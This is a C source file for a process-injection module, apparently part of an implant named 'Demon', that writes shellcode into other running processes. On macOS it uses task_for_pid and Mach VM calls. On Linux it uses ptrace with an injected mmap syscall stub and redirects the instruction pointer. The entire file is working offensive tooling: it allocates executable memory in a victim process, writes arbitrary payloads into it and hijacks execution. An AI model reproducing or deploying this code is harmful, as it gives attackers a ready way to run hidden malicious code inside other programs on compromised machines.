/*
 * Inject.c — Process injection for Linux (ptrace) and macOS (task_for_pid).
 *
 * Linux:  Uses ptrace PTRACE_ATTACH + PTRACE_POKEDATA to write shellcode
 *         into a remote process and redirect its instruction pointer.
 *
 * macOS:  Uses task_for_pid() + mach_vm_allocate() + mach_vm_write() +
 *         thread_create_running() to inject shellcode into a remote process.
 *         Requires the injecting process to have the task_for_pid-allow
 *         entitlement or be root.
 *
 * NOTE:   This module is provided for completeness.  On modern macOS with
 *         SIP enabled, task_for_pid() only works when root or with specific
 *         entitlements. Plan accordingly.
 */

#include "DemonPosix.h"
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>

#ifdef __APPLE__
/* ─────────────────────────────────────────────────────────────────────
 * macOS injection via Mach task port
 * ──────────────────────────────────────────────────────────────────── */
#include <mach/mach.h>
#include <mach/mach_vm.h>

bool InjectShellcode(uint32_t pid, const uint8_t *sc, size_t sc_len)
{
    kern_return_t kr;
    task_t        target_task = TASK_NULL;

    /* Get a send right to the target task */
    kr = task_for_pid(mach_task_self(), (pid_t)pid, &target_task);
    if (kr != KERN_SUCCESS) {
        DEMON_LOG("task_for_pid(%u) failed: %d", pid, kr);
        return false;
    }

    /* Allocate RWX memory in the target */
    mach_vm_address_t remote_addr = 0;
    kr = mach_vm_allocate(target_task, &remote_addr, sc_len,
                          VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        DEMON_LOG("mach_vm_allocate failed: %d", kr);
        mach_port_deallocate(mach_task_self(), target_task);
        return false;
    }

    /* Make it RWX */
    kr = mach_vm_protect(target_task, remote_addr, sc_len, FALSE,
                         VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) {
        DEMON_LOG("mach_vm_protect failed: %d", kr);
        mach_vm_deallocate(target_task, remote_addr, sc_len);
        mach_port_deallocate(mach_task_self(), target_task);
        return false;
    }

    /* Write the shellcode */
    kr = mach_vm_write(target_task, remote_addr, (vm_offset_t)sc,
                       (mach_msg_type_number_t)sc_len);
    if (kr != KERN_SUCCESS) {
        DEMON_LOG("mach_vm_write failed: %d", kr);
        mach_vm_deallocate(target_task, remote_addr, sc_len);
        mach_port_deallocate(mach_task_self(), target_task);
        return false;
    }

    /* Create a new thread starting at the shellcode */
#if defined(__x86_64__)
    x86_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    state.__rip = remote_addr;
    state.__rsp = remote_addr + sc_len; /* rough stack pointer */

    thread_act_t new_thread;
    kr = thread_create_running(target_task, x86_THREAD_STATE64,
                               (thread_state_t)&state,
                               x86_THREAD_STATE64_COUNT,
                               &new_thread);
#elif defined(__aarch64__)
    arm_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    arm_thread_state64_set_pc_fptr(state, (void *)remote_addr);

    thread_act_t new_thread;
    kr = thread_create_running(target_task, ARM_THREAD_STATE64,
                               (thread_state_t)&state,
                               ARM_THREAD_STATE64_COUNT,
                               &new_thread);
#else
    kr = KERN_NOT_SUPPORTED;
#endif

    if (kr != KERN_SUCCESS) {
        DEMON_LOG("thread_create_running failed: %d", kr);
        mach_vm_deallocate(target_task, remote_addr, sc_len);
        mach_port_deallocate(mach_task_self(), target_task);
        return false;
    }

    mach_port_deallocate(mach_task_self(), target_task);
    DEMON_LOG("macOS injection into PID %u succeeded at 0x%llx", pid, (uint64_t)remote_addr);
    return true;
}

#else /* Linux */
/* ─────────────────────────────────────────────────────────────────────
 * Linux injection via ptrace
 * ──────────────────────────────────────────────────────────────────── */
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/mman.h>

/* Helper: write arbitrary bytes via ptrace POKEDATA */
static bool ptrace_write(pid_t pid, uintptr_t addr, const uint8_t *data, size_t len)
{
    for (size_t i = 0; i < len; i += sizeof(long)) {
        long word = 0;
        size_t chunk = (len - i < sizeof(long)) ? (len - i) : sizeof(long);
        if (chunk < sizeof(long)) {
            /* partial word: read first */
            errno = 0;
            word = ptrace(PTRACE_PEEKDATA, pid, (void *)(addr + i), NULL);
            if (errno) return false;
        }
        memcpy(&word, data + i, chunk);
        if (ptrace(PTRACE_POKEDATA, pid, (void *)(addr + i), (void *)word) < 0)
            return false;
    }
    return true;
}

bool InjectShellcode(uint32_t pid, const uint8_t *sc, size_t sc_len)
{
    /* Attach to the target process */
    if (ptrace(PTRACE_ATTACH, (pid_t)pid, NULL, NULL) < 0) {
        DEMON_LOG("PTRACE_ATTACH(%u) failed: %s", pid, strerror(errno));
        return false;
    }

    int status;
    waitpid((pid_t)pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        ptrace(PTRACE_DETACH, (pid_t)pid, NULL, NULL);
        return false;
    }

    /* Get current registers */
    struct user_regs_struct regs, saved_regs;
    if (ptrace(PTRACE_GETREGS, (pid_t)pid, NULL, &regs) < 0) {
        ptrace(PTRACE_DETACH, (pid_t)pid, NULL, NULL);
        return false;
    }
    memcpy(&saved_regs, &regs, sizeof(regs));

    /*
     * Allocate memory via mmap syscall in the target process.
     * We inject a small mmap stub, execute it, then write the shellcode
     * into the allocated region.
     *
     * mmap(NULL, len, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
     *
     * Syscall number on x86_64 Linux: 9 (mmap)
     * We write the syscall instruction at rip, save registers, call it,
     * then restore registers and write the shellcode there.
     */
#ifdef __x86_64__
    uint8_t mmap_stub[] = {
        0x0f, 0x05,  /* syscall */
        0xcc         /* int3 — trap after mmap returns */
    };

    uintptr_t orig_rip  = (uintptr_t)regs.rip;

    /* Write the stub at the current rip */
    uint8_t saved_bytes[sizeof(mmap_stub)];
    for (size_t i = 0; i < sizeof(mmap_stub); i += sizeof(long)) {
        long w = ptrace(PTRACE_PEEKDATA, (pid_t)pid,
                        (void *)(orig_rip + i), NULL);
        memcpy(saved_bytes + i, &w,
               (sizeof(mmap_stub)-i < sizeof(long)) ? sizeof(mmap_stub)-i : sizeof(long));
    }
    ptrace_write((pid_t)pid, orig_rip, mmap_stub, sizeof(mmap_stub));

    /* Set up mmap syscall args */
    regs.rax = 9;              /* SYS_mmap */
    regs.rdi = 0;              /* addr = NULL */
    regs.rsi = sc_len;         /* length */
    regs.rdx = 7;              /* PROT_READ|PROT_WRITE|PROT_EXEC */
    regs.r10 = 0x22;           /* MAP_PRIVATE|MAP_ANONYMOUS */
    regs.r8  = (unsigned long long)-1; /* fd = -1 */
    regs.r9  = 0;              /* offset = 0 */
    ptrace(PTRACE_SETREGS, (pid_t)pid, NULL, &regs);

    /* Single-step until int3 */
    ptrace(PTRACE_CONT, (pid_t)pid, NULL, NULL);
    waitpid((pid_t)pid, &status, 0);

    /* Read mmap result from rax */
    struct user_regs_struct post_regs;
    ptrace(PTRACE_GETREGS, (pid_t)pid, NULL, &post_regs);
    uintptr_t remote_mem = (uintptr_t)post_regs.rax;

    /* Restore original bytes at rip */
    ptrace_write((pid_t)pid, orig_rip, saved_bytes, sizeof(mmap_stub));

    if (remote_mem == (uintptr_t)-1 || remote_mem == 0) {
        ptrace(PTRACE_SETREGS, (pid_t)pid, NULL, &saved_regs);
        ptrace(PTRACE_DETACH, (pid_t)pid, NULL, NULL);
        DEMON_LOG("remote mmap failed");
        return false;
    }

    /* Write the shellcode */
    ptrace_write((pid_t)pid, remote_mem, sc, sc_len);

    /* Restore registers and redirect rip to shellcode */
    memcpy(&regs, &saved_regs, sizeof(regs));
    regs.rip = remote_mem;
    ptrace(PTRACE_SETREGS, (pid_t)pid, NULL, &regs);

    /* Detach and let it run */
    ptrace(PTRACE_DETACH, (pid_t)pid, NULL, NULL);
    DEMON_LOG("Linux injection into PID %u at 0x%lx succeeded", pid, remote_mem);
    return true;

#elif defined(__aarch64__)
    /* ARM64 Linux injection — mmap via syscall no. 222 */
    uint8_t mmap_stub[] = {
        0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
        0x00, 0x00, 0x20, 0xd4   /* brk #0 — trap */
    };

    uintptr_t orig_pc = (uintptr_t)regs.pc;
    uint8_t saved_bytes[sizeof(mmap_stub)];
    for (size_t i = 0; i < sizeof(mmap_stub); i += sizeof(long)) {
        long w = ptrace(PTRACE_PEEKDATA, (pid_t)pid, (void *)(orig_pc+i), NULL);
        memcpy(saved_bytes+i, &w, sizeof(long));
    }
    ptrace_write((pid_t)pid, orig_pc, mmap_stub, sizeof(mmap_stub));

    regs.regs[8] = 222; /* SYS_mmap */
    regs.regs[0] = 0;
    regs.regs[1] = sc_len;
    regs.regs[2] = 7;    /* RWX */
    regs.regs[3] = 0x22; /* MAP_PRIVATE|MAP_ANONYMOUS */
    regs.regs[4] = (unsigned long long)-1;
    regs.regs[5] = 0;
    ptrace(PTRACE_SETREGS, (pid_t)pid, NULL, &regs);

    ptrace(PTRACE_CONT, (pid_t)pid, NULL, NULL);
    waitpid((pid_t)pid, &status, 0);

    struct user_regs_struct post_regs;
    ptrace(PTRACE_GETREGS, (pid_t)pid, NULL, &post_regs);
    uintptr_t remote_mem = (uintptr_t)post_regs.regs[0];

    ptrace_write((pid_t)pid, orig_pc, saved_bytes, sizeof(mmap_stub));

    if (remote_mem == (uintptr_t)-1 || remote_mem == 0) {
        ptrace(PTRACE_SETREGS, (pid_t)pid, NULL, &saved_regs);
        ptrace(PTRACE_DETACH, (pid_t)pid, NULL, NULL);
        return false;
    }

    ptrace_write((pid_t)pid, remote_mem, sc, sc_len);

    memcpy(&regs, &saved_regs, sizeof(regs));
    regs.pc = remote_mem;
    ptrace(PTRACE_SETREGS, (pid_t)pid, NULL, &regs);
    ptrace(PTRACE_DETACH, (pid_t)pid, NULL, NULL);
    DEMON_LOG("ARM64 Linux injection into PID %u succeeded", pid);
    return true;

#else
    ptrace(PTRACE_DETACH, (pid_t)pid, NULL, NULL);
    DEMON_LOG("Injection not implemented for this architecture");
    return false;
#endif
}
#endif /* __APPLE__ */
